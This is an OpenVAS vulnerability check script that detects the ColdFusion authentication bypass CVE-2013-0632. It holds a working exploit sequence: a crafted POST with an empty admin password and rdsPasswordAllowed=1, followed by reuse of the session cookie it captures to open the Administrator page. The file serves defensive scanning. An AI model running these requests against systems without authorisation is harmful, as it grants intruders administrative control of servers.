###############################################################################
# OpenVAS Vulnerability Test
#
# Adobe ColdFusion Authentication Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:adobe:coldfusion";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103769");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2013-0632");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2022-08-09T10:11:17+0000");

  script_name("Adobe ColdFusion Authentication Bypass Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57330");

  script_tag(name:"last_modification", value:"2022-08-09 10:11:17 +0000 (Tue, 09 Aug 2022)");
  script_tag(name:"creation_date", value:"2013-08-20 12:36:50 +0200 (Tue, 20 Aug 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_coldfusion_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("adobe/coldfusion/http/detected");

  script_tag(name:"impact", value:"An attacker can exploit this issue to bypass certain authentication
  processes and potentially allow an attacker to take control of the affected system.");

  script_tag(name:"vuldetect", value:"Try to bypass authentication by sending some HTTP requests.");

  script_tag(name:"insight", value:"Adobe ColdFusion versions 9.0, 9.0.1, and 9.0.2 do not properly check the
  'rdsPasswordAllowed' field when accessing the Administrator API CFC that is used for logging in.");

  script_tag(name:"solution", value:"Vendor updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Adobe ColdFusion is prone to a remote authentication-bypass vulnerability.");

  script_tag(name:"affected", value:"ColdFusion 9.0, 9.0.1, 9.0.2.

  Note: This issue affects ColdFusion customers who do not have password
  protection enabled or do not have a password set.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

host = http_host_name(port:port);

req = 'POST /CFIDE/adminapi/administrator.cfc?method=login HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Connection: close\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: 35\r\n' +
      '\r\n' +
      'adminpassword=&rdsPasswordAllowed=1';

result = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("<wddxPacket" >!< result || "'true'" >!< result)
  exit(0);

k = eregmatch(pattern:"CFAUTHORIZATION_cfadmin=([^;]+);", string:result);
if(isnull(k[1]))
  exit(0);

req = 'GET /CFIDE/administrator/homepage.cfm HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Connection: close\r\n' +
      'Cookie: CFAUTHORIZATION_cfadmin=' + k[1] + '\r\n\r\n';

result = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("<title>ColdFusion Administrator Home Page</title>" >< result &&
   "Welcome to the ColdFusion Administrator" >< result) {
  security_message(port:port);
  exit(0);
}

exit(99);
